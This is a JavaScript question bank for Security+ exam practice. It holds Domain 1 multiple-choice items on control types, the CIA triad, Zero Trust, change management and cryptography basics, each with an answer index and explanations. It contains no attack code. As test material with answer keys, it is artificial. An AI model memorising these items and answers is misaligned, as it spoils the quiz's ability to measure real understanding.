/* security+ :: quizEngine.js  (data bank + assessment engine) */
SECPLUS.questions = SECPLUS.questions || [];
SECPLUS.pbqs = SECPLUS.pbqs || [];
SECPLUS.questions.push(
{ id:"D1-001", domain:1, obj:"1.1", diff:"easy", q:"Which control category includes policies, procedures, and standards that govern how an organization manages security?", options:["Managerial","Operational","Physical","Technical"], answer:0, explain:"<strong>Managerial</strong> (administrative) controls are the governance documents such as policies, procedures, and standards that direct how security is managed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Technical</b>: technical (logical) controls are enforced by hardware or software such as firewalls and encryption, not by written governance documents.</span><span class='qd'><b>Operational</b>: operational controls are day-to-day actions performed by people, like guard patrols and awareness training, rather than the policies that govern them.</span><span class='qd'><b>Physical</b>: physical controls are tangible barriers like locks and fences that restrict physical access, not administrative documents.</span>" },
{ id:"D1-002", domain:1, obj:"1.1", diff:"easy", q:"A firewall that filters network traffic is an example of which control category?", options:["Operational","Technical","Physical","Managerial"], answer:1, explain:"<strong>Technical</strong> (logical) controls are implemented through hardware or software, and a firewall enforces security by filtering traffic through technology.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Managerial</b>: managerial controls are administrative policies and standards that govern security, not the technology that enforces it.</span><span class='qd'><b>Operational</b>: operational controls are processes carried out by people, whereas a firewall acts automatically without human execution.</span><span class='qd'><b>Physical</b>: physical controls are tangible barriers protecting physical access, while a firewall regulates logical network traffic.</span>" },
{ id:"D1-003", domain:1, obj:"1.1", diff:"easy", q:"Security guards and security awareness training that are performed by people fall under which control category?", options:["Managerial","Compensating","Operational","Technical"], answer:2, explain:"<strong>Operational</strong> controls are executed primarily by people in their daily work, such as guards on patrol and staff attending security awareness training.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Technical</b>: technical controls are enforced by technology like software or hardware, not by human activity.</span><span class='qd'><b>Managerial</b>: managerial controls are the governance documents and risk decisions that direct security, not the people-driven execution of those decisions.</span><span class='qd'><b>Compensating</b>: compensating is a control function describing an alternative when a primary control is infeasible, not the people-versus-technology category being asked about.</span>" },
{ id:"D1-004", domain:1, obj:"1.1", diff:"medium", q:"A locked server room door, a bollard, and a fence are all examples of which control category?", options:["Managerial","Technical","Operational","Physical"], answer:3, explain:"<strong>Physical</strong> controls are tangible barriers that restrict physical access to assets, and locked doors, bollards, and fences all physically block entry.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Technical</b>: technical controls operate through software or hardware logic, not as physical barriers to a building or room.</span><span class='qd'><b>Operational</b>: operational controls are the human processes that may enforce security, whereas the barriers themselves are physical objects.</span><span class='qd'><b>Managerial</b>: managerial controls are written policies and standards, not the physical structures protecting tangible assets.</span>" },
{ id:"D1-005", domain:1, obj:"1.1", diff:"easy", q:"A control designed to discourage a threat actor from attempting an attack, such as a visible warning sign, is which control TYPE?", options:["Deterrent","Corrective","Preventive","Detective"], answer:0, explain:"<strong>Deterrent</strong> controls discourage a threat actor from attempting an attack but do not technically stop it, which fits a visible warning sign.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Detective</b>: a detective control identifies an attack as or after it occurs, such as an alarm or log, but a sign detects nothing.</span><span class='qd'><b>Corrective</b>: a corrective control reverses or repairs damage after an incident, like restoring from backup, not dissuading beforehand.</span><span class='qd'><b>Preventive</b>: a preventive control actively blocks the action, like a lock or firewall rule, whereas a sign only dissuades and cannot enforce.</span>" },
{ id:"D1-006", domain:1, obj:"1.1", diff:"easy", q:"An intrusion detection system (IDS) that generates an alert when suspicious activity occurs is which control TYPE?", options:["Deterrent","Detective","Directive","Preventive"], answer:1, explain:"<strong>Detective</strong> controls identify and report suspicious activity as or after it occurs, which is exactly what an IDS alert does.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Preventive</b>: a preventive control would actively block the activity, but an IDS only observes and alerts without stopping traffic.</span><span class='qd'><b>Deterrent</b>: a deterrent control discourages an attacker from trying, while an IDS plays no role until activity is already happening.</span><span class='qd'><b>Directive</b>: a directive control instructs people on required behavior through policy, not by automatically detecting and alerting on activity.</span>" },
{ id:"D1-007", domain:1, obj:"1.1", diff:"medium", q:"After a malware infection, an organization restores affected systems from clean backups. The restoration process is which control TYPE?", options:["Compensating","Deterrent","Corrective","Detective"], answer:2, explain:"<strong>Corrective</strong> controls remediate or reverse the impact of an incident, and restoring systems from clean backups fixes the damage caused by the malware.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Detective</b>: a detective control only identifies that an incident occurred, such as antivirus flagging the infection, but does not repair the damage.</span><span class='qd'><b>Compensating</b>: a compensating control is an alternative measure used when a primary control is not feasible, not the act of repairing harm already done.</span><span class='qd'><b>Deterrent</b>: a deterrent control discourages an attack beforehand and has no role in recovering systems after an infection.</span>" },
{ id:"D1-008", domain:1, obj:"1.1", diff:"medium", q:"An organization cannot patch a legacy system, so it isolates the system on a separate network segment to reduce risk. This isolation is BEST described as which control TYPE?", options:["Directive","Detective","Preventive","Compensating"], answer:3, explain:"A <strong>compensating</strong> control is an alternative measure used when the primary control is not feasible, and network isolation substitutes for the patch that cannot be applied.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Preventive</b>: while segmentation does reduce exposure, the question stresses that it stands in for an unavailable patch, which specifically defines a compensating control.</span><span class='qd'><b>Directive</b>: a directive control mandates behavior through policy or instruction, not by technically isolating a host.</span><span class='qd'><b>Detective</b>: a detective control would identify an attack in progress, whereas isolating the segment proactively limits the risk instead of detecting it.</span>" },
{ id:"D1-009", domain:1, obj:"1.1", diff:"medium", q:"A policy that instructs employees to lock their workstations when leaving their desks is which control TYPE?", options:["Directive","Compensating","Detective","Corrective"], answer:0, explain:"<strong>Directive</strong> controls mandate or instruct people on the required behavior, and a policy telling employees to lock their workstations directs the desired action.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Detective</b>: a detective control would identify when a workstation was left unlocked, not instruct users to lock it.</span><span class='qd'><b>Corrective</b>: a corrective control repairs damage after an incident, but the policy is a preventive instruction issued beforehand.</span><span class='qd'><b>Compensating</b>: a compensating control is an alternative substitute for an infeasible primary control, which is not what a behavioral policy represents.</span>" },
{ id:"D1-010", domain:1, obj:"1.1", diff:"hard", q:"A company installs door locks to keep intruders out (a preventive measure) but also wants a record of who entered each room. Which ADDITIONAL control type BEST satisfies the record-keeping need?", options:["Deterrent control such as warning signage","Detective control such as an access-log badge reader","Corrective control such as a backup generator","Directive control such as an acceptable use policy"], answer:1, explain:"A badge reader that logs entries is a <strong>detective</strong> control because it records and can later reveal who accessed each room.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Deterrent control such as warning signage</b>: signage only discourages intruders and keeps no record of who actually entered.</span><span class='qd'><b>Corrective control such as a backup generator</b>: a generator restores power after a failure and does nothing to record room access.</span><span class='qd'><b>Directive control such as an acceptable use policy</b>: a policy instructs behavior but cannot capture an audit trail of physical entries.</span>" },
{ id:"D1-011", domain:1, obj:"1.1", diff:"hard", q:"An auditor notes that an organization relies on encryption (a technical, preventive control) but has no way to identify ongoing data exfiltration. Which control would BEST close this gap?", options:["A managerial control such as a new data classification policy","A physical control such as a locked wiring closet","A technical detective control such as a DLP monitoring solution","A deterrent control such as a login banner"], answer:2, explain:"A <strong>technical detective</strong> control such as data loss prevention monitoring can identify and alert on data exfiltration as it happens, closing the visibility gap.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A managerial control such as a new data classification policy</b>: a classification policy guides how data is labeled but cannot detect data actively leaving the network.</span><span class='qd'><b>A physical control such as a locked wiring closet</b>: a locked closet protects physical hardware and does nothing to observe logical data movement.</span><span class='qd'><b>A deterrent control such as a login banner</b>: a banner may discourage misuse but provides no detection of exfiltration in progress.</span>" },
{ id:"D1-012", domain:1, obj:"1.2", diff:"easy", q:"Which element of the CIA triad ensures that information is not disclosed to unauthorized individuals?", options:["Authentication","Integrity","Availability","Confidentiality"], answer:3, explain:"<strong>Confidentiality</strong> ensures information is not disclosed to unauthorized individuals, typically enforced through encryption and access controls.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Integrity</b>: integrity protects data from unauthorized modification, ensuring accuracy, not secrecy.</span><span class='qd'><b>Availability</b>: availability ensures data is accessible when needed, which is unrelated to preventing disclosure.</span><span class='qd'><b>Authentication</b>: authentication verifies identity and is not one of the three CIA triad goals.</span>" },
{ id:"D1-013", domain:1, obj:"1.2", diff:"easy", q:"Hashing a file and later recomputing the hash to verify it has not changed primarily supports which security goal?", options:["Integrity","Availability","Non-repudiation","Confidentiality"], answer:0, explain:"<strong>Integrity</strong> ensures data has not been altered, and recomputing a matching hash confirms the file is unchanged.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Confidentiality</b>: hashing does not conceal the data, so it provides no protection against unauthorized disclosure.</span><span class='qd'><b>Availability</b>: availability concerns whether data is accessible when needed, which hashing does not address.</span><span class='qd'><b>Non-repudiation</b>: non-repudiation requires a digital signature binding an action to a signer, whereas a bare hash proves no identity.</span>" },
{ id:"D1-014", domain:1, obj:"1.2", diff:"easy", q:"A redundant power supply and clustered servers most directly support which part of the CIA triad?", options:["Integrity","Availability","Accounting","Confidentiality"], answer:1, explain:"<strong>Availability</strong> ensures systems and data are accessible when needed, and redundant power and clustering keep services running despite component failures.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Confidentiality</b>: confidentiality concerns preventing disclosure, not keeping systems online.</span><span class='qd'><b>Integrity</b>: integrity protects data from unauthorized change, which redundancy does not directly provide.</span><span class='qd'><b>Accounting</b>: accounting tracks user actions for review and is not part of the CIA triad.</span>" },
{ id:"D1-015", domain:1, obj:"1.2", diff:"medium", q:"In the AAA framework, which step confirms that a user is who they claim to be?", options:["Auditing","Authorization","Authentication","Accounting"], answer:2, explain:"<strong>Authentication</strong> confirms a user is who they claim to be, typically using credentials or factors.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Authorization</b>: authorization determines what an already-verified user is permitted to do, occurring after identity is proven.</span><span class='qd'><b>Accounting</b>: accounting records the actions a user performs and does not verify identity.</span><span class='qd'><b>Auditing</b>: auditing reviews logged activity after the fact rather than confirming a user's claimed identity.</span>" },
{ id:"D1-016", domain:1, obj:"1.2", diff:"medium", q:"After a user logs in, the system determines which files they may read or modify. This decision is part of which AAA component?", options:["Identification","Authentication","Accounting","Authorization"], answer:3, explain:"<strong>Authorization</strong> grants or restricts access to resources based on the verified user's permissions, deciding which files they may read or modify.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Authentication</b>: authentication only proves identity and does not assign which resources a user can access.</span><span class='qd'><b>Accounting</b>: accounting logs what a user did after the fact, not what they are permitted to do.</span><span class='qd'><b>Identification</b>: identification is merely the user asserting a username or identity, which precedes both authentication and authorization.</span>" },
{ id:"D1-017", domain:1, obj:"1.2", diff:"medium", q:"Logging each action a user performs so it can be reviewed later supports which AAA component?", options:["Accounting","Authorization","Authentication","Attestation"], answer:0, explain:"<strong>Accounting</strong> (also called auditing) records the actions a user performs so they can be reviewed later, supporting accountability.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Authorization</b>: authorization decides what a user may access, not the logging of what they did.</span><span class='qd'><b>Authentication</b>: authentication verifies identity and does not by itself create a record of activity.</span><span class='qd'><b>Attestation</b>: attestation is a claim or proof about a system or device state, not the ongoing logging of user actions.</span>" },
{ id:"D1-018", domain:1, obj:"1.2", diff:"medium", q:"Which security concept ensures that a sender cannot later deny having sent a digitally signed message?", options:["Integrity","Non-repudiation","Availability","Confidentiality"], answer:1, explain:"<strong>Non-repudiation</strong> prevents a sender from denying an action, and a digital signature provides it by binding the message to the signer's private key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Confidentiality</b>: confidentiality hides message content from unauthorized parties but does not prove who sent it.</span><span class='qd'><b>Integrity</b>: integrity alone proves the message was not altered but cannot establish the identity of the sender.</span><span class='qd'><b>Availability</b>: availability ensures access to data and has nothing to do with proving authorship.</span>" },
{ id:"D1-019", domain:1, obj:"1.2", diff:"easy", q:"What is the core principle of a Zero Trust architecture?", options:["Trust users after a single successful login","Trust all traffic inside the corporate perimeter","Never trust, always verify every request","Trust devices once they pass the firewall"], answer:2, explain:"Zero Trust assumes no implicit trust and requires continuous verification of every request, captured by <strong>Never trust, always verify every request</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Trust all traffic inside the corporate perimeter</b>: this is the legacy perimeter model that Zero Trust was created to replace.</span><span class='qd'><b>Trust devices once they pass the firewall</b>: granting implicit trust after the firewall contradicts Zero Trust, which continuously reverifies devices.</span><span class='qd'><b>Trust users after a single successful login</b>: Zero Trust demands ongoing verification rather than trusting a one-time login.</span>" },
{ id:"D1-020", domain:1, obj:"1.2", diff:"hard", q:"In the Zero Trust model, the component that makes the access decision based on policy is the policy decision point. Which component actually ENFORCES that decision on the connection?", options:["Policy information point","Policy engine","Policy administrator","Policy enforcement point"], answer:3, explain:"The <strong>policy enforcement point</strong> enforces the access decision by allowing or blocking the actual connection.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Policy engine</b>: the policy engine evaluates rules and makes the decision, but it does not enforce it on the connection.</span><span class='qd'><b>Policy administrator</b>: the policy administrator communicates the engine's decision to the enforcement point but does not itself pass or block traffic.</span><span class='qd'><b>Policy information point</b>: the policy information point supplies contextual data for the decision and plays no enforcement role.</span>" },
{ id:"D1-021", domain:1, obj:"1.2", diff:"hard", q:"In a Zero Trust deployment, the policy engine and policy administrator make and communicate access decisions. These two components are collectively known as which plane?", options:["Control plane","Management plane","Trust plane","Data plane"], answer:0, explain:"The policy engine and policy administrator together form the <strong>control plane</strong>, which decides and conveys access decisions.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Data plane</b>: the data plane is where the enforcement point actually passes or blocks traffic, not where decisions are made.</span><span class='qd'><b>Management plane</b>: the management plane handles administration and configuration of devices, which is not the Zero Trust decision-making grouping.</span><span class='qd'><b>Trust plane</b>: trust plane is not a defined component of the Zero Trust architecture.</span>" },
{ id:"D1-022", domain:1, obj:"1.2", diff:"medium", q:"A honeypot is deployed on a network primarily to achieve which objective?", options:["Encrypt sensitive data at rest","Lure and study attackers away from real assets","Provide redundant storage capacity","Authenticate remote users"], answer:1, explain:"A <strong>Lure and study attackers away from real assets</strong> describes a honeypot, a decoy system used to attract, detect, and analyze attackers.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypt sensitive data at rest</b>: encryption protects confidentiality of stored data and is unrelated to a deception decoy.</span><span class='qd'><b>Provide redundant storage capacity</b>: redundant storage supports availability, not the luring of attackers.</span><span class='qd'><b>Authenticate remote users</b>: authentication verifies identity and has nothing to do with a decoy system.</span>" },
{ id:"D1-023", domain:1, obj:"1.2", diff:"medium", q:"Which deception technology consists of fake credentials or files placed to alert defenders when an attacker accesses them?", options:["Sinkhole","Honeynet","Honeytoken","Honeypot"], answer:2, explain:"A <strong>Honeytoken</strong> is bogus data such as fake credentials or files that triggers an alert when an attacker accesses or uses it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Honeynet</b>: a honeynet is an entire decoy network of multiple honeypots, not a single fake credential or file.</span><span class='qd'><b>Honeypot</b>: a honeypot is a complete decoy system, whereas a honeytoken is a small piece of planted bait data.</span><span class='qd'><b>Sinkhole</b>: a sinkhole redirects malicious traffic to a controlled destination and is not planted bait data that triggers an alert.</span>" },
{ id:"D1-024", domain:1, obj:"1.2", diff:"hard", q:"A security team wants to detect lateral movement by attackers who have already breached the perimeter, without exposing real production data. Which deception approach BEST fits?", options:["Encrypt all internal databases with AES-256","Require MFA for all external logins","Deploy a single internet-facing honeypot in the DMZ","Place honeytokens and internal decoy hosts within the production segments"], answer:3, explain:"Internal <strong>Place honeytokens and internal decoy hosts within the production segments</strong> reveal attackers already moving laterally without exposing real data.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Deploy a single internet-facing honeypot in the DMZ</b>: a perimeter honeypot catches external probing but cannot detect movement already inside the network.</span><span class='qd'><b>Encrypt all internal databases with AES-256</b>: encryption protects data confidentiality but provides no detection of lateral movement.</span><span class='qd'><b>Require MFA for all external logins</b>: external MFA strengthens perimeter authentication and does nothing to spot an attacker already past it.</span>" },
{ id:"D1-025", domain:1, obj:"1.2", diff:"medium", q:"What is the primary purpose of a gap analysis in a security program?", options:["Compare the current security state to a desired state","Authenticate privileged users","Recover systems after a disaster","Encrypt data in transit"], answer:0, explain:"A <strong>Compare the current security state to a desired state</strong> defines a gap analysis, which measures the difference against a target framework to guide remediation.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Encrypt data in transit</b>: encrypting traffic is a technical control, not an assessment comparing security posture to a goal.</span><span class='qd'><b>Authenticate privileged users</b>: authenticating users verifies identity and is unrelated to measuring program maturity.</span><span class='qd'><b>Recover systems after a disaster</b>: disaster recovery restores operations after an incident, not before, and is not a gap assessment.</span>" },
{ id:"D1-026", domain:1, obj:"1.2", diff:"hard", q:"An organization adopting Zero Trust wants the access decision to consider device health, user behavior, and threat intelligence each time. The component supplying this contextual data to the decision process is BEST described as the:", options:["Policy enforcement point","Policy information point","Subject","System resource"], answer:1, explain:"The <strong>Policy information point</strong> supplies contextual data such as device health, behavior, and threat intelligence to the policy engine for each decision.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Policy enforcement point</b>: the enforcement point only acts on the resulting decision and does not gather context.</span><span class='qd'><b>Subject</b>: the subject is the user or service requesting access, not a source of decision context.</span><span class='qd'><b>System resource</b>: the system resource is the asset being protected, not a feed of contextual data.</span>" },
{ id:"D1-027", domain:1, obj:"1.2", diff:"medium", q:"A mantrap (access control vestibule) installed at a data center entrance is intended primarily to prevent which physical security threat?", options:["Eavesdropping on wireless signals","SQL injection","Tailgating/piggybacking","Shoulder surfing"], answer:2, explain:"An access control vestibule (<strong>Tailgating/piggybacking</strong>) permits one person through at a time, preventing an unauthorized person from following an authorized one.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Shoulder surfing</b>: shoulder surfing is observing a person entering credentials, which a vestibule does not address.</span><span class='qd'><b>Eavesdropping on wireless signals</b>: wireless eavesdropping intercepts radio traffic and is a logical, not physical-entry, threat.</span><span class='qd'><b>SQL injection</b>: SQL injection is an application attack against a database and is entirely unrelated to physical entry control.</span>" },
{ id:"D1-028", domain:1, obj:"1.2", diff:"easy", q:"Which physical control uses unique biological characteristics, such as a fingerprint, to grant access?", options:["PIN pad","Bollard","Proximity card","Biometric reader"], answer:3, explain:"A <strong>Biometric reader</strong> authenticates based on unique physical traits such as fingerprints or retinas, which is something you are.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Proximity card</b>: a proximity card is something you have, not a biological characteristic.</span><span class='qd'><b>PIN pad</b>: a PIN is something you know, relying on memorized digits rather than a physical trait.</span><span class='qd'><b>Bollard</b>: a bollard is a physical barrier that stops vehicles and performs no identity authentication.</span>" },
{ id:"D1-029", domain:1, obj:"1.2", diff:"easy", q:"Sturdy posts installed in front of a building entrance to stop vehicles from ramming it are called:", options:["Bollards","Turnstiles","Mantraps","Faraday cages"], answer:0, explain:"<strong>Bollards</strong> are short, sturdy posts installed to block vehicles from ramming a building entrance.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Turnstiles</b>: a turnstile controls pedestrian flow one person at a time, not vehicle ramming.</span><span class='qd'><b>Mantraps</b>: a mantrap (access control vestibule) prevents tailgating by people, not vehicle attacks.</span><span class='qd'><b>Faraday cages</b>: a Faraday cage blocks electromagnetic signals and has no role in stopping vehicles.</span>" },
{ id:"D1-030", domain:1, obj:"1.2", diff:"medium", q:"Which security goal is MOST directly threatened by a ransomware attack that encrypts production files?", options:["Confidentiality","Availability","Non-repudiation","Authentication"], answer:1, explain:"Ransomware that encrypts production files denies legitimate access to data, directly attacking <strong>Availability</strong>.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Confidentiality</b>: confidentiality is threatened only if data is exfiltrated, but the encryption-for-ransom action itself blocks access rather than disclosing it.</span><span class='qd'><b>Non-repudiation</b>: non-repudiation concerns proving who performed an action and is not what ransomware disrupts.</span><span class='qd'><b>Authentication</b>: authentication verifies identity and is not the goal undermined by encrypting files.</span>" },
{ id:"D1-031", domain:1, obj:"1.3", diff:"easy", q:"What is the primary purpose of a formal change management process?", options:["To replace identity and access management","To eliminate the need for backups","To control and document modifications to systems in a structured way","To encrypt all network traffic"], answer:2, explain:"A formal change management process exists <strong>To control and document modifications to systems in a structured way</strong>, reducing risk and unplanned outages.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To eliminate the need for backups</b>: change management never removes the need for backups, which remain essential for recovery.</span><span class='qd'><b>To encrypt all network traffic</b>: encrypting traffic is a technical control unrelated to governing changes.</span><span class='qd'><b>To replace identity and access management</b>: change management governs modifications, it does not perform or replace IAM functions.</span>" },
{ id:"D1-032", domain:1, obj:"1.3", diff:"medium", q:"During the change management process, which group typically reviews and formally approves or rejects proposed changes?", options:["Help desk","Red team","Security operations center","Change advisory board"], answer:3, explain:"The <strong>Change advisory board</strong> evaluates proposed changes and formally approves or rejects them.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Security operations center</b>: the SOC monitors and responds to security events, not the approval of change requests.</span><span class='qd'><b>Help desk</b>: the help desk provides user support and ticketing, not formal change approval authority.</span><span class='qd'><b>Red team</b>: the red team simulates attacks to test defenses and plays no part in approving changes.</span>" },
{ id:"D1-033", domain:1, obj:"1.3", diff:"medium", q:"A change request includes a documented plan to revert the system to its prior state if the change fails. This plan is called the:", options:["Backout plan","Impact analysis","Standard operating procedure","Maintenance window"], answer:0, explain:"A <strong>Backout plan</strong> documents how to revert the system to its prior working state if the change fails.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Maintenance window</b>: the maintenance window is the scheduled time to perform the change, not the procedure to undo it.</span><span class='qd'><b>Impact analysis</b>: an impact analysis assesses potential effects before approval, not the rollback steps after failure.</span><span class='qd'><b>Standard operating procedure</b>: an SOP is a routine documented process for normal operations, not a change-specific rollback plan.</span>" },
{ id:"D1-034", domain:1, obj:"1.3", diff:"medium", q:"Why is performing an impact analysis an important part of evaluating a proposed change?", options:["It encrypts the affected systems","It identifies the potential effects and risks of the change before approval","It automatically deploys the change to production","It assigns blame after an outage"], answer:1, explain:"An impact analysis <strong>It identifies the potential effects and risks of the change before approval</strong>, enabling informed approval decisions.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It encrypts the affected systems</b>: encryption is a technical control and is not part of analyzing change risk.</span><span class='qd'><b>It automatically deploys the change to production</b>: an impact analysis is a planning step, not a deployment mechanism.</span><span class='qd'><b>It assigns blame after an outage</b>: impact analysis is a forward-looking assessment, not a post-incident blame exercise.</span>" },
{ id:"D1-035", domain:1, obj:"1.3", diff:"hard", q:"A change is approved but the team schedules it for 2 a.m. Sunday to minimize disruption to users. This scheduled timeframe is BEST described as the:", options:["Test environment","Backout plan","Maintenance window","Change advisory board"], answer:2, explain:"The <strong>Maintenance window</strong> is the approved timeframe for performing a change with minimal business impact, such as 2 a.m. Sunday.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Backout plan</b>: the backout plan describes how to undo a change, not when it is scheduled.</span><span class='qd'><b>Change advisory board</b>: the CAB is the group that approves changes, not a scheduled time period.</span><span class='qd'><b>Test environment</b>: a test environment is where changes are validated before production, not the production scheduling window.</span>" },
{ id:"D1-036", domain:1, obj:"1.3", diff:"hard", q:"After a firewall rule change, ownership of the change documentation and version history must be maintained for audits. Updating diagrams, policies, and configuration baselines after a change is referred to as:", options:["Allow list maintenance","Service restart","Standard operating procedure","Updating documentation"], answer:3, explain:"<strong>Updating documentation</strong> means revising diagrams, baselines, and policies after a change so records stay accurate for audits and future work.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Standard operating procedure</b>: an SOP is a routine process document, not the act of updating records after a specific change.</span><span class='qd'><b>Allow list maintenance</b>: maintaining an allow list manages permitted entities and is only one narrow task, not the broad documentation update described.</span><span class='qd'><b>Service restart</b>: restarting a service is an operational action and does nothing to preserve change history for audits.</span>" },
{ id:"D1-037", domain:1, obj:"1.3", diff:"hard", q:"An organization wants pre-approved, low-risk, repeatable changes (such as routine password resets) to bypass the full CAB review. This category of change is BEST classified as a:", options:["Standard change","Normal change","Unauthorized change","Emergency change"], answer:0, explain:"A <strong>Standard change</strong> is pre-approved, low-risk, and repeatable, so routine work like password resets can proceed without full CAB review.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Emergency change</b>: an emergency change is unplanned and urgent, requiring expedited handling rather than routine pre-approval.</span><span class='qd'><b>Normal change</b>: a normal change goes through the full assessment and CAB approval process, which is exactly what a standard change bypasses.</span><span class='qd'><b>Unauthorized change</b>: an unauthorized change is one made without any approval, the opposite of a pre-approved standard change.</span>" },
{ id:"D1-038", domain:1, obj:"1.4", diff:"easy", q:"Which type of cryptography uses the SAME key to encrypt and decrypt data?", options:["Asymmetric","Symmetric","Hashing","Public key"], answer:1, explain:"<strong>Symmetric</strong> encryption uses a single shared secret key for both encryption and decryption, which makes it fast for bulk data.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Asymmetric</b>: asymmetric encryption uses a public and private key pair, two different keys, not the same one.</span><span class='qd'><b>Hashing</b>: hashing is a one-way function that uses no key and cannot decrypt anything.</span><span class='qd'><b>Public key</b>: public key cryptography is another name for asymmetric encryption, which uses paired keys rather than one shared key.</span>" },
{ id:"D1-039", domain:1, obj:"1.4", diff:"easy", q:"Which of the following is a symmetric encryption algorithm?", options:["Diffie-Hellman","RSA","AES","ECC"], answer:2, explain:"<strong>AES</strong> (Advanced Encryption Standard) is a symmetric block cipher that uses one shared key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>RSA</b>: RSA is an asymmetric algorithm using a public and private key pair.</span><span class='qd'><b>ECC</b>: ECC is asymmetric, basing key pairs on elliptic curve mathematics.</span><span class='qd'><b>Diffie-Hellman</b>: Diffie-Hellman is an asymmetric key-exchange method, not a symmetric cipher.</span>" },
{ id:"D1-040", domain:1, obj:"1.4", diff:"medium", q:"In asymmetric cryptography, which key should a user share openly with others?", options:["Session key","Symmetric key","Private key","Public key"], answer:3, explain:"The <strong>Public key</strong> is meant to be distributed freely so others can encrypt to or verify the owner.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Private key</b>: the private key must remain secret to its owner and is never shared.</span><span class='qd'><b>Session key</b>: a session key is a temporary symmetric secret for one session and is not openly published.</span><span class='qd'><b>Symmetric key</b>: a symmetric key is a shared secret that must be protected, not openly distributed.</span>" },
{ id:"D1-041", domain:1, obj:"1.4", diff:"medium", q:"To send a confidential message using asymmetric encryption, which key does the sender use to encrypt the message?", options:["The recipient's public key","The recipient's private key","The sender's public key","The sender's private key"], answer:0, explain:"The sender encrypts with <strong>The recipient's public key</strong> so only the recipient's matching private key can decrypt the message, providing confidentiality.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The sender's private key</b>: encrypting with the sender's private key creates a signature anyone can verify, not a confidential message.</span><span class='qd'><b>The recipient's private key</b>: the sender does not have the recipient's private key, which is secret to the recipient alone.</span><span class='qd'><b>The sender's public key</b>: encrypting with the sender's own public key would require the sender's private key to decrypt, so the recipient could not read it.</span>" },
{ id:"D1-042", domain:1, obj:"1.4", diff:"medium", q:"A digital signature is created by encrypting a message's hash with which key?", options:["The recipient's public key","The signer's private key","A shared symmetric key","The recipient's private key"], answer:1, explain:"A digital signature is created by encrypting the message hash with <strong>The signer's private key</strong>, which anyone can verify with the signer's public key.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>The recipient's public key</b>: encrypting with the recipient's public key provides confidentiality, not a verifiable signature from the signer.</span><span class='qd'><b>A shared symmetric key</b>: a shared symmetric key cannot prove a single signer's identity since both parties hold it, breaking non-repudiation.</span><span class='qd'><b>The recipient's private key</b>: the signer does not possess the recipient's private key and cannot use it to sign.</span>" },
{ id:"D1-043", domain:1, obj:"1.4", diff:"easy", q:"Which property of a cryptographic hash function means it is computationally infeasible to find two different inputs that produce the same output?", options:["Key length","Confidentiality","Collision resistance","Reversibility"], answer:2, explain:"<strong>Collision resistance</strong> means it is computationally infeasible to find two different inputs that produce the same hash output.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Confidentiality</b>: confidentiality concerns hiding data, but hashing is one-way and not designed to keep data secret.</span><span class='qd'><b>Reversibility</b>: a secure hash is deliberately one-way and irreversible, so reversibility is not a property of it.</span><span class='qd'><b>Key length</b>: key length relates to encryption strength, whereas a hash function uses no key.</span>" },
{ id:"D1-044", domain:1, obj:"1.4", diff:"easy", q:"Which of the following is a hashing algorithm rather than an encryption algorithm?", options:["Blowfish","AES","RSA","SHA-256"], answer:3, explain:"<strong>SHA-256</strong> is a one-way hashing algorithm that produces a fixed-length digest and cannot be reversed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>AES</b>: AES is a symmetric encryption cipher designed to be reversible with a key.</span><span class='qd'><b>RSA</b>: RSA is an asymmetric encryption algorithm, not a hashing function.</span><span class='qd'><b>Blowfish</b>: Blowfish is a symmetric block cipher meant for reversible encryption, not hashing.</span>" },
